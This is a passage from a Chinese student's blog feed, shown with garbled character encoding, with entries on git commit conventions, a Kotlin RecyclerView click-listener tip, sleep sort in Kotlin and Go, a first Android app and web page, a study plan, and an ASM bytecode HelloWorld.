        <content type="html"><![CDATA[<h1 id="Commit-è§„èŒƒ"><a href="#Commit-è§„èŒƒ" class="headerlink" title="Commit è§„èŒƒ"></a>Commit è§„èŒƒ</h1><p>copyçš„å­¦é•¿çš„gitæ•™ç¨‹ã€‚</p><p>ä»¥å‰éƒ½æ²¡æ€ä¹ˆæ³¨æ„commitè¿™æ–¹é¢çš„è§„èŒƒï¼Œä»¥åè¦å¤šåŠ æ³¨æ„</p><blockquote><p>æè¿°å†™æ³•å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">[type]titledescribtion<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>typeå¦‚ä¸‹ï¼š</p><ul><li>fix â€”â€”â€”â€”-&gt; bug ä¿®æŠ¤</li><li>feature â€”â€”-&gt; éœ€æ±‚</li><li>optimize â€”â€”&gt; ä¼˜åŒ–</li><li>release â€”â€”â€“&gt; ç‰ˆæœ¬å‡çº§</li><li>style â€”â€”â€”â€”&gt; ä»£ç æ ¼å¼è°ƒæ•´ï¼Œä¸æ¶‰åŠä»£ç æ›´æ”¹</li></ul><p>titleï¼šéœ€æ±‚æ ‡é¢˜ï¼ˆå¯¹äºè¯¥commitçš„ç®€å•æè¿°ï¼‰</p><p>describtionï¼šéœ€æ±‚çš„å…·ä½“æè¿°ï¼ˆå¦‚æœè¿‡äºç®€å•çš„æäº¤å¯ä»¥ä¸ç”¨å†™è¯¥éƒ¨åˆ†ï¼‰</p><p>è‹¥æäº¤æ¶ˆæ¯æœ‰è¯´æ˜é—æ¼ï¼Œå¯ä»¥é€šè¿‡ [Amend](#Amend æŒ‰é’®) è¿›è¡Œè¡¥æ•‘</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Androidå¼€å‘ç¬”è®°å…¶ä¸€</title>
      <link href="/2021/10/24/android-note-1/"/>
      <url>/2021/10/24/android-note-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Androidå¼€å‘ç¬”è®°å…¶ä¸€"><a href="#Androidå¼€å‘ç¬”è®°å…¶ä¸€" class="headerlink" title="Androidå¼€å‘ç¬”è®°å…¶ä¸€"></a>Androidå¼€å‘ç¬”è®°å…¶ä¸€</h1><h1 id="RecyclerViewçš„onItemClickå›è°ƒå‡½æ•°åœ¨onBindViewHolderä¸­è°ƒç”¨ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜"><a href="#RecyclerViewçš„onItemClickå›è°ƒå‡½æ•°åœ¨onBindViewHolderä¸­è°ƒç”¨ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜" class="headerlink" title="RecyclerViewçš„onItemClickå›è°ƒå‡½æ•°åœ¨onBindViewHolderä¸­è°ƒç”¨ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜"></a>RecyclerViewçš„onItemClickå›è°ƒå‡½æ•°åœ¨onBindViewHolderä¸­è°ƒç”¨ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜</h1><p><strong>åä¾‹</strong></p><p>ä¼šå¯¼è‡´ä¸æ–­çš„åˆ›å»ºåŒ¿åç±»ï¼Œä»è€Œå¯¼è‡´å¤§é‡çš„æ€§èƒ½æµªè´¹</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">private</span> <span class="token keyword">var</span> itemClickListener<span class="token operator">:</span> <span class="token punctuation">(</span>Int<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> Unit <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">onBindViewHolder</span><span class="token punctuation">(</span>holder<span class="token operator">:</span> ViewHolder<span class="token punctuation">,</span> position<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">val</span> fruit <span class="token operator">=</span> <span class="token keyword">data</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span>     holder<span class="token punctuation">.</span>fruitImage<span class="token punctuation">.</span><span class="token function">setImageResource</span><span class="token punctuation">(</span>fruit<span class="token punctuation">.</span>image<span class="token punctuation">)</span>     holder<span class="token punctuation">.</span>fruitName<span class="token punctuation">.</span>text <span class="token operator">=</span> fruit<span class="token punctuation">.</span>name     holder<span class="token punctuation">.</span>itemView<span class="token punctuation">.</span><span class="token function">setOnClickListener</span> <span class="token punctuation">{</span>         <span class="token function">itemClickListener</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token comment">/**  * å›è°ƒä¼ å‚  */</span> <span class="token keyword">fun</span> <span class="token function">onItemClick</span><span class="token punctuation">(</span>func<span class="token operator">:</span> <span class="token punctuation">(</span>Int<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> Unit<span class="token punctuation">)</span> <span class="token punctuation">{</span>     itemClickListener <span class="token operator">=</span> func <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>æ­£ç¡®çš„åšæ³•</strong></p><p>å°†å›è°ƒå‡½æ•°åœ¨ViewHolderä¸­è°ƒç”¨</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"> <span class="token keyword">private</span> <span class="token keyword">var</span> itemClickListener<span class="token operator">:</span> <span class="token punctuation">(</span>Int<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> Unit <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span> <span class="token keyword">inner</span> <span class="token keyword">class</span> <span class="token function">ViewHolder</span><span class="token punctuation">(</span>view<span class="token operator">:</span> View<span class="token punctuation">)</span> <span class="token operator">:</span> RecyclerView<span class="token punctuation">.</span><span class="token function">ViewHolder</span><span class="token punctuation">(</span>view<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">init</span> <span class="token punctuation">{</span>         view<span class="token punctuation">.</span><span class="token function">setOnClickListener</span> <span class="token punctuation">{</span>             <span class="token function">itemClickListener</span><span class="token punctuation">(</span>bindingAdapterPosition<span class="token punctuation">)</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">val</span> fruitImage<span class="token operator">:</span> ImageView <span class="token operator">=</span> view<span class="token punctuation">.</span>fruitImage     <span class="token keyword">val</span> fruitName<span class="token operator">:</span> TextView <span class="token operator">=</span> view<span class="token punctuation">.</span>fruitName <span class="token punctuation">}</span> <span class="token comment">/**  * å›è°ƒä¼ å‚  */</span> <span class="token keyword">fun</span> <span class="token function">onItemClick</span><span class="token punctuation">(</span>func<span class="token operator">:</span> <span class="token punctuation">(</span>Int<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> Unit<span class="token punctuation">)</span> <span class="token punctuation">{</span>     itemClickListener <span class="token operator">=</span> func <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”¨kotlinåç¨‹å®ç°äº†ç¡çœ æ’åº</title>
      <link href="/2021/10/18/kotlin-sleep-sort/"/>
      <url>/2021/10/18/kotlin-sleep-sort/</url>
      
        <content type="html"><![CDATA[<h1 id="ç”¨kotlinåç¨‹å®ç°äº†ç¡çœ æ’åº"><a href="#ç”¨kotlinåç¨‹å®ç°äº†ç¡çœ æ’åº" class="headerlink" title="ç”¨kotlinåç¨‹å®ç°äº†ç¡çœ æ’åº"></a>ç”¨kotlinåç¨‹å®ç°äº†ç¡çœ æ’åº</h1><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// ç¡çœ æ’åº kotlinå®ç°</span><span class="token comment">// éœ€è¦ç”¨åˆ°åç¨‹åº“</span><span class="token comment">// ktç”¨å¤šçº¿ç¨‹å†™å¤šæ²¡æ„æ€</span><span class="token keyword">fun</span> <span class="token function">sleepSort</span><span class="token punctuation">(</span>array<span class="token operator">:</span> Array<span class="token operator">&lt;</span>Int<span class="token operator">?</span><span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> List<span class="token operator">&lt;</span>Int<span class="token operator">?</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> result <span class="token operator">=</span> arrayListOf<span class="token operator">&lt;</span>Int<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> list <span class="token operator">=</span> arrayListOf<span class="token operator">&lt;</span>Deferred<span class="token operator">&lt;</span>Unit<span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">in</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>GlobalScope<span class="token punctuation">.</span><span class="token function">async</span> <span class="token punctuation">{</span>            <span class="token function">delay</span><span class="token punctuation">(</span>i<span class="token operator">!!</span> <span class="token operator">*</span> <span class="token number">10L</span><span class="token punctuation">)</span>            result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            Unit        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment">// å µå¡è‡³æ“ä½œå®Œæˆ</span>    runBlocking <span class="token punctuation">{</span>        list<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>            it<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> ç®—æ³• </tag>
            
            <tag> Coroutine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ¼ å±€ æ‰“ å¼€</title>
      <link href="/2021/10/17/mind-opening/"/>
      <url>/2021/10/17/mind-opening/</url>
      
        <content type="html"><![CDATA[<h1 id="æ ¼-å±€-æ‰“-å¼€"><a href="#æ ¼-å±€-æ‰“-å¼€" class="headerlink" title="æ ¼ å±€ æ‰“ å¼€"></a>æ ¼ å±€ æ‰“ å¼€</h1><p>ä»Šå¤©è§è¯†åˆ°äº†å¤§ä½¬çš„ç‰›é€¼ç¡æ’</p><p>è¿™ä¸ªæ€è·¯éœ‡æ’¼åˆ°æˆ‘äº†ï¼Œæˆ‘ç¬¬ä¸€æ¬¡è§è¯†åˆ°è¿™ç§æ’åºæ–¹æ³•ã€‚è™½ç„¶æ˜¯å¾ˆä¹…ä»¥å‰å°±æœ‰çš„ç®—æ³•ï¼Œä½†æ˜¯ç¬¬ä¸€æ¬¡è§è¯†åˆ°æˆ‘è¿˜æ˜¯è¢«éœ‡æƒŠåˆ°äº†ã€‚</p><p>å†é…åˆä¸Šgoçš„åç¨‹æ¥å®ç°è¿™ä¸ªåŠŸèƒ½ï¼ŒçœŸæ˜¯å¦™æäº†ï¼çŸ­çŸ­15è¡Œä»£ç ï¼Œè®©æˆ‘å¦‚é†é†çŒé¡¶</p><p>æˆ‘è¶…ï¼Œè¿™å°±æ˜¯åŒå¹´çº§çš„å·ç‹ï¼Œè¿™ä½æ›´æ˜¯çº¢å²©ä¹‹å…‰</p><p>ä»£ç ï¼ˆä¸æ˜¯å¤§ä½¬çš„ä»£ç ï¼Œæ˜¯æˆ‘æŒ‰ç…§ä»–çš„ä»£ç è‡ªå·±ç äº†ä¸€éï¼Œè·Ÿå¤§ä½¬ä»£ç æœ‰éƒ¨åˆ†å‡ºå…¥)</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// ä»çœŸæ­£çš„å¤§ä½¬é‚£é‡ŒæŠ„æ¥çš„ä»£ç </span><span class="token comment">// ç¡æ’ï¼Œå¼€ç¡ï¼</span><span class="token comment">// è™½ç„¶ç¡®å®æ˜¯ä¸€ç§éå¸¸æ£’çš„æ€è·¯ï¼Œä½†ç”±äºæ•°å­—å·®è·è¾ƒå°æ—¶è¾ƒå®¹æ˜“äº§ç”Ÿè¯¯å·®ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå¹¶ä¸å¤ªå®ç”¨</span><span class="token comment">// æˆ–è€…...æˆ‘ä»¬å¯ä»¥ç‰ºç‰²æ›´å¤šçš„æ’åºæ—¶é—´æ¥æ¢å–å®ƒçš„ç²¾ç¡®æ€§,å³æŠŠå…ƒç¡çœ æ—¶é—´å¢å¤§</span><span class="token keyword">func</span> <span class="token function">sortSleep</span><span class="token punctuation">(</span>origin <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span> <span class="token punctuation">{</span><span class="token comment">// ä¸åˆå§‹åŒ–ä¹Ÿå¯ä»¥append</span><span class="token keyword">var</span> edited <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token keyword">var</span> wg sync<span class="token punctuation">.</span>WaitGroupwg<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token function">len</span><span class="token punctuation">(</span>origin<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> <span class="token boolean">_</span><span class="token punctuation">,</span> i <span class="token operator">:=</span> <span class="token keyword">range</span> origin <span class="token punctuation">{</span><span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span>num <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>time<span class="token punctuation">.</span><span class="token function">Sleep</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Duration</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">*</span> time<span class="token punctuation">.</span>Millisecond <span class="token operator">*</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token comment">// è¿™é‡Œå¦‚æœæ”¹ä¸ºä¸€ç™¾ï¼Œç»“æœå°±éå¸¸å‡†ç¡®äº†ï¼Œä½†å¦‚æœæ˜¯10ï¼Œè¿˜æ˜¯éå¸¸å®¹æ˜“äº§ç”Ÿè¯¯å·®</span>edited <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span>edited<span class="token punctuation">,</span> num<span class="token punctuation">)</span>wg<span class="token punctuation">.</span><span class="token function">Done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">}</span>wg<span class="token punctuation">.</span><span class="token function">Wait</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">return</span> edited<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è‰ï¼Œå‘æ˜ç¡çœ æ’åºçš„é‚£ä¸ªäººï¼ŒçœŸå¯„å§æ˜¯ä¸ªå¤©æ‰</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³• </tag>
            
            <tag> Coroutine </tag>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼€å‘äº†ç¬¬ä¸€ä¸ªè‡ªå·±çš„å®‰å“è½¯ä»¶</title>
      <link href="/2021/10/15/my-first-android-application/"/>
      <url>/2021/10/15/my-first-android-application/</url>
      
        <content type="html"><![CDATA[<p>å®‰å“å¼€å‘çš„ä¹¦çœ‹äº†ä¸å°‘äº†ï¼Œæˆ‘å´é²œæœ‰å®è·µã€‚äºæ˜¯ä»Šå¤©æˆ‘å†³å®šå°è¯•ä¸€ä¸‹ï¼Œäºæ˜¯å°±æœ‰äº†å®ƒ <a href="https://github.com/ColdRain-Moro/RegexTesterAndroid">ColdRain-Moro/RegexTesterAndroid: æˆ‘çš„ç¬¬ä¸€ä¸ªå®‰å“ç¨‹åº (github.com)</a></p><p>æˆ‘å†™çš„ç¨‹åºå¤ªå¤šäº†ï¼Œä½†å®ƒä¹Ÿè®¸æ˜¯å…¶ä¸­å”¯ä¸€ä¸€ä¸ªå¤Ÿæ ¼è¢«ç§°ä¹‹ä¸ºè½¯ä»¶çš„ç¨‹åºï¼Œå› ä¸ºå®ƒå¯ä»¥ç‹¬ç«‹è¿è¡Œï¼Œå¹¶ä¸”å…·æœ‰ä¸€å®šçš„æœ‰æ„ä¹‰çš„åŠŸèƒ½ï¼Œå¹¶ä¸”æœ‰è¿˜ç®—èƒ½çœ‹çš„UIç•Œé¢ã€‚ï¼ˆè™½ç„¶å®ƒçš„ä»£ç é‡éå¸¸çš„å°‘ï¼‰æˆ‘ä»¥å‰åšçš„Minecraftæ’ä»¶å¼€å‘å…¶å®éƒ½åªæ˜¯å¯¹äºMinecraftæœåŠ¡ç«¯åŠŸèƒ½çš„ä¿®æ”¹ç½¢äº†ã€‚</p><p>å…¶å®æˆ‘ä¸æ˜¯å¾ˆå–œæ¬¢Androidè¿™ç§ç”¨xmlæ¥åšuiå¸ƒå±€çš„åšæ³• ï¼ˆæ„Ÿè§‰â€¦ä¸å¦‚html+cssï¼‰ï¼Œæ‰€å¹¸Android Studioæä¾›äº†ä¾¿æ·çš„UIç¼–è¾‘å·¥å…·ã€‚Jetpack Composeæ‰æ˜¯æœ€åˆæˆ‘å£å‘³çš„uiç¼–è¾‘æ–¹å¼ï¼Œå°±æ˜¯æˆ‘å‡­æˆ‘ç°åœ¨çš„èƒ½åŠ›ä¹Ÿè®¸è¿˜ä¸è¶³ä»¥èƒ½æŒæ¡å®ƒã€‚</p><p>æ€»ä¹‹ï¼Œå…ˆè€è€å®å®å­¦ç‚¹åŸºç¡€å§ï¼Œå¥½é«˜éª›è¿œä¹Ÿä¸æ˜¯ä»¶å¥½äº‹</p><p><a href="https://camo.githubusercontent.com/323eccd940618f7f7dc6deaf6b8f3fe43cb052597f3369fb2e7d9684dca903c6/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f72656765787465737465722e706e67"><img src="https://camo.githubusercontent.com/323eccd940618f7f7dc6deaf6b8f3fe43cb052597f3369fb2e7d9684dca903c6/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f72656765787465737465722e706e67" alt="regextester"></a></p><p><a href="https://camo.githubusercontent.com/bfcac0a18ebee0c5aa1f20e4641b7d77880f423ebe1647df51281f35fb109845/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f72656765787465737465725f312e706e67"><img src="https://camo.githubusercontent.com/bfcac0a18ebee0c5aa1f20e4641b7d77880f423ebe1647df51281f35fb109845/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f72656765787465737465725f312e706e67" alt="regextester_1"></a></p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿›å…¥å¤§å­¦åä¸€æ®µæ—¶é—´çš„æ€»ç»“</title>
      <link href="/2021/10/14/enter-college/"/>
      <url>/2021/10/14/enter-college/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿›å…¥å¤§å­¦åä¸€æ®µæ—¶é—´çš„æ€»ç»“"><a href="#è¿›å…¥å¤§å­¦åä¸€æ®µæ—¶é—´çš„æ€»ç»“" class="headerlink" title="è¿›å…¥å¤§å­¦åä¸€æ®µæ—¶é—´çš„æ€»ç»“"></a>è¿›å…¥å¤§å­¦åä¸€æ®µæ—¶é—´çš„æ€»ç»“</h1><p>æˆ‘è¿‡å¾—å¾ˆå……å®ï¼Œå¾ˆå¿«ä¹ã€‚å› ä¸ºè¿™æ®µæ—¶é—´æˆ‘é€‰æ‹©äº†è·Ÿèˆå‹çš„ç‹è€…ä¹‹è·¯æˆªç„¶ä¸åŒçš„ä¸€æ¡è†æ£˜ä¹‹è·¯ï¼Œæˆ‘èƒ½åˆ‡èº«åˆ‡å®çš„æ„Ÿå—çš„æˆ‘æŠ€æœ¯çš„æˆé•¿ã€‚ç”šè‡³è¿˜ç”¨è‡ªå·±åˆšå­¦ä¸¤å¤©çš„å‰ç«¯çŸ¥è¯†å†™äº†ä¸€ä¸ªä¸ªäººä¸»é¡µğŸ¤£</p><h2 id="æˆ‘çš„å­¦ä¹ è®¡åˆ’"><a href="#æˆ‘çš„å­¦ä¹ è®¡åˆ’" class="headerlink" title="æˆ‘çš„å­¦ä¹ è®¡åˆ’"></a>æˆ‘çš„å­¦ä¹ è®¡åˆ’</h2><p>è¿›å…¥å¤§å­¦ä»¥æ¥ï¼Œæˆ‘èƒ½æ¥è§¦åˆ°çš„çŸ¥è¯†è¶Šæ¥è¶Šå¤šäº†ï¼Œå°†ä»–ä»¬åœ¨çŸ­æ—¶é—´å…¨éƒ¨å­¦å®Œå¤§æ¦‚æ˜¯ä¸å¯èƒ½çš„ã€‚</p><p>å¹¶ä¸”æˆ‘ä¹Ÿéœ€è¦ç¡®ç«‹è‡ªå·±æœªæ¥çš„å‘å±•æ–¹å‘ï¼ŒæŠŠç²¾åŠ›ç”¨åœ¨åˆ€åˆƒä¸Š ï¼ˆä¸è¿‡æˆ‘ç°åœ¨è¿˜æ²¡ä»€ä¹ˆå¤´ç»ªï¼‰</p><p>å§‘ä¸”å…ˆç†ä¸€ä¸‹ç°åœ¨è¦å­¦çš„çŸ¥è¯†å§</p><h3 id="Schedule"><a href="#Schedule" class="headerlink" title="Schedule"></a>Schedule</h3><ul><li>Android å¼€å‘ &amp; Kotlin -&gt; jetpack compose çš„ä½¿ç”¨ (ç§»åŠ¨)</li><li>Html/CSS/JavaScript/TypeScript -&gt; Node.js/React (å‰ç«¯)</li><li>Golang (åç«¯)</li><li>AOP-é¢å‘åˆ‡é¢ç¼–ç¨‹æ€æƒ³</li><li>C++/C#</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç”Ÿæ´» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°è¯•ç”¨CSS/Htmlå†™äº†è‡ªå·±çš„ç¬¬ä¸€ä¸ªç½‘ç«™</title>
      <link href="/2021/10/12/my-first-web-page/"/>
      <url>/2021/10/12/my-first-web-page/</url>
      
        <content type="html"><![CDATA[<p>å› ä¸ºæˆä¸ºäº†çº¢å²©ç½‘æ ¡çš„webå‰ç«¯éƒ¨é—¨çš„å­¦å‘˜ï¼Œæˆ‘å­¦ä¹ äº†ä¸€äº›CSS/Htmlçš„çŸ¥è¯†</p><p>è¯´èµ·æ¥ï¼Œä¹‹æ‰€ä»¥æ‰“ç®—å­¦ä¹ å‰ç«¯ï¼Œæ˜¯æƒ³è¦å†™ä¸€ä¸ªè‡ªå·±çš„ä¸ªäººä¸»é¡µ ï¼ˆå½“åˆçœ‹è§äº†è´ºå…°çš„ä¸ªäººä¸»é¡µï¼Œè§‰å¾—é€¼æ ¼é¢‡é«˜ï¼Œä¾¿å¯¹æ­¤äº§ç”Ÿäº†å…´è¶£ï¼‰</p><p>ä½†æˆ‘æ²¡æƒ³åˆ°è¿™ä¹ˆå¿«å°±ä¼šè¿æ¥å®ç°çš„ä¸€å¤©ã€‚å½“ç„¶ï¼Œè·Ÿè´ºå…°é‚£ä¸ªå¯èƒ½è¿˜æœ‰äº›å·®è·ï¼Œæ¯•ç«Ÿæˆ‘åªç”¨äº†CSS/Htmlã€‚</p><p><a href="https://camo.githubusercontent.com/a4365e6360c95dc52de9c66391ce5d2b35adc31d4c334827e566ce416f0e6766/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f706167652e706e67"><img src="https://camo.githubusercontent.com/a4365e6360c95dc52de9c66391ce5d2b35adc31d4c334827e566ce416f0e6766/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f706167652e706e67" alt="60223956_p0"></a></p><p>æ€»ä½“æˆ‘è¿˜æ˜¯ç›¸å½“æ»¡æ„çš„ï¼Œä¾¿ç”¨github-pageså°†å®ƒéƒ¨ç½²äº†ä¸Šæ¥ã€‚å¹¶ä¸”coldrain.inkçš„åŸŸåè§£æåˆ°äº†è¿™ä¸ªä¸»é¡µä¸Šï¼ŒæŠŠä¹‹å‰åšå®¢çš„åŸŸåæ¢æˆäº†blog.coldrain.inkã€‚</p><p>åªå­¦ä¸¤å¤©ä¾¿èƒ½çœ‹åˆ°æˆæœï¼Œä¹Ÿéš¾æ€ªæœ‰äººè¯´å­¦html/cssæ¯”å­¦javaè¿™äº›ç¼–ç¨‹è¯­è¨€æ›´å®¹æ˜“åšæŒä¸‹æ¥äº†</p>]]></content>
      
      
      <categories>
          
          <category> æ‚è°ˆ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å‰ç«¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”¨ASMå†™ä¸€ä¸ªHelloWorld</title>
      <link href="/2021/10/11/hello-asm/"/>
      <url>/2021/10/11/hello-asm/</url>
      
        <content type="html"><![CDATA[<h1 id="ç”¨ASMå†™ä¸€ä¸ªHelloWorld"><a href="#ç”¨ASMå†™ä¸€ä¸ªHelloWorld" class="headerlink" title="ç”¨ASMå†™ä¸€ä¸ªHelloWorld"></a>ç”¨ASMå†™ä¸€ä¸ªHelloWorld</h1><p>ä»Šå¤©ä¸Šè®¡ç®—æœºåº”ç”¨èƒ½åŠ›è¯¾çš„æ—¶å€™å¤ªæ— èŠï¼Œç®€å•çš„ç ”ç©¶äº†ä¸€ä¸‹ASMï¼Œç”¨ASMç”Ÿæˆäº†ä¸€ä¸ªå«æœ‰HelloWorldçš„ç±»<br>ä¸å¾—ä¸è¯´ï¼ŒASMæ˜¯çœŸçš„é»‘é­”æ³•</p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">public</span> <span class="token keyword">class</span> ASMTest <span class="token punctuation">{</span>    <span class="token keyword">public</span> static void <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> throws NoSuchMethodException<span class="token punctuation">,</span> InvocationTargetException<span class="token punctuation">,</span> IllegalAccessException <span class="token punctuation">{</span>        byte<span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        MyClassLoader cl <span class="token operator">=</span> new <span class="token function">MyClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Class<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token operator">&gt;</span> clazz <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">defineClass</span><span class="token punctuation">(</span><span class="token string">"team.redrock.coldrain.asmtest.HelloWorldASM"</span><span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>        Method m <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"main"</span><span class="token punctuation">,</span> String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>class<span class="token punctuation">)</span><span class="token punctuation">;</span>        m<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> new Object<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>new String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    static byte<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ClassWriter cw <span class="token operator">=</span> new <span class="token function">ClassWriter</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cw<span class="token punctuation">.</span><span class="token function">visit</span><span class="token punctuation">(</span>Opcodes<span class="token punctuation">.</span>V1_8<span class="token punctuation">,</span> Opcodes<span class="token punctuation">.</span>ACC_PUBLIC<span class="token punctuation">,</span> <span class="token 